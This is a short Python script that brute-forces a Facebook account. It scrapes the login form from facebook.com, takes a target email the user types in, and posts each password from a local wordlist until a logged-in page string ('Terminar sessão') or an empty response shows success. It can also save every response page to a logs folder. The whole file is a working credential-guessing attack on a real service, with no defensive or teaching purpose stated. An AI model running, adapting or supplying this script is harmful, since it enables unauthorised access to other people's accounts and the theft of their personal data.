import requests
from os import getcwd, mkdir
from utils import get_element, convert_form_to_dict
from terminal import cracking, finded_password
from time import sleep
import inquirer

settings = {
    "url": "https://www.facebook.com/login.php"
}

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
})


def getPage():
    res = session.get(settings["url"])
    return res.text


def writeFile(name, content):
    log = open(f"{getcwd()}/logs/{name}.html", "w")
    log.write(content)


def main():
    questions = [
        inquirer.Text("email", message="What your email?"),
        inquirer.Confirm("logs", message="Save logs?")
    ]

    options = inquirer.prompt(questions)
    html = getPage()
    formEl = get_element(html, "form")
    data = convert_form_to_dict(formEl)
    data["email"] = options["email"]

    file = open(f"{getcwd()}/data/wordlist1.txt", "r")
    while True:

        try:
            line = next(file)
            data["pass"] = line
            res = session.post(settings["url"], data=data)
            content = res.text
            if options["logs"]:
                try:
                    writeFile(line, content)
                except FileNotFoundError:
                    mkdir(f"{getcwd()}/logs")
                    writeFile(line, content)

            if ("Terminar sessão" in content or len(content) == 0):
                finded_password(line)
                break

            cracking(line)

            sleep(3)
        except StopIteration:
            print("SORRY ):")
            break

    file.close()


try:
    main()
except KeyboardInterrupt:
    print("\n\nBye :)")
